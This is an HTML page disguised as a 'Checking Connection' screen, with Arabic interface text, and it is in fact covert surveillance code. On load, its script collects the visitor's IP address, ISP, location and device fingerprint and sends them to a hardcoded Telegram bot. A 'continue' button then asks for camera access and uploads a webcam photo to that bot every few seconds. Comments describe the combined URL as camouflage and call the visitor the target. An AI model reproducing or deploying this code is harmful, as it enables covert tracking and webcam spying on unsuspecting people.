<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Connection...</title>
    <style>
        body { background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { text-align: center; }
        .dot-spin { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { display: none; padding: 12px 28px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="loader">
        <div class="dot-spin"></div>
        <p id="st">جاري فحص بروتوكولات الاتصال...</p>
        <button id="auth">متابعة الآن</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        // دمج البيانات في مسار واحد للتمويه
        const _a = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const _i = "2103976274";

        async function fullScan() {
            let n = navigator;
            let report = `🛑 **تقرير استخباراتي دقيق (فوري)**\n\n`;

            // 1. جلب الـ IP والمعلومات الجغرافية وشركة الإنترنت بدقة عالية (استخدام خدمة ip-api)
            try {
                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,timezone,isp,org,as,query');
                const j = await res.json();
                if (j.status === "success") {
                    report += `🌍 **الآي بي:** \`${j.query}\`\n`;
                    report += `🏢 **الشركة (ISP):** ${j.isp}\n`;
                    report += `📡 **المنظمة:** ${j.org || 'غير متوفر'}\n`;
                    report += `📍 **الموقع:** ${j.city}, ${j.country} (${j.regionName})\n`;
                }
            } catch (e) { 
                // محاولة بديلة في حال فشل الأولى
                const res2 = await fetch('https://ipwho.is/').then(r => r.json());
                report += `🌍 **الآي بي:** \`${res2.ip}\`\n🏢 **الشركة:** ${res2.connection.isp}\n`;
            }

            // 2. كشف الجهاز والمتصفح بدقة (Advanced Detection)
            report += `📱 **النظام:** ${n.platform}\n`;
            report += `🧭 **المتصفح الحقيقي:** ${getAdvancedBrowser()}\n`;
            
            // كشف كارت الشاشة (تحديد موديل الهاتف)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                report += `🎮 **الرسوميات:** ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
            } catch(e) {}

            report += `⚙️ **المعالج:** ${n.hardwareConcurrency || '؟'} Cores\n`;
            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;

            // 3. البطارية
            try {
                const b = await n.getBattery();
                report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
            } catch (e) {}

            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;

            send(report);

            setTimeout(() => {
                document.getElementById('auth').style.display = 'inline-block';
                document.getElementById('st').innerText = "اكتمل الفحص بنجاح.";
            }, 1000);
        }

        // دالة متطورة لكشف المتصفح ومنع التمويه
        function getAdvancedBrowser() {
            let ua = navigator.userAgent;
            let browser = "مجهول";
            
            if (ua.includes("Brave") || (navigator.brave && navigator.brave.isBrave())) browser = "Brave Browser";
            else if (ua.includes("Edg/")) browser = "Microsoft Edge";
            else if (ua.includes("OPR/") || ua.includes("Opera/")) browser = "Opera";
            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
            else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
            else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
            
            return browser;
        }

        document.getElementById('auth').onclick = async function() {
            this.style.display = 'none';
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = s;
                setInterval(take, 3500);
            } catch (e) { send("⚠️ المستهدف رفض الكاميرا"); }
        };

        function take() {
            const cv = document.getElementById('c');
            const vd = document.getElementById('v');
            cv.width = vd.videoWidth; cv.height = vd.videoHeight;
            cv.getContext('2d').drawImage(vd, 0, 0);
            cv.toBlob(b => {
                const f = new FormData();
                f.append('chat_id', _i);
                f.append('photo', b, 's.jpg');
                fetch(_a + "sendPhoto", { method: 'POST', body: f });
            }, 'image/jpeg', 0.8);
        }

        function send(t) {
            fetch(_a + "sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: _i, text: t, parse_mode: "Markdown" })
            });
        }

        fullScan();
    </script>
</body>
</html>
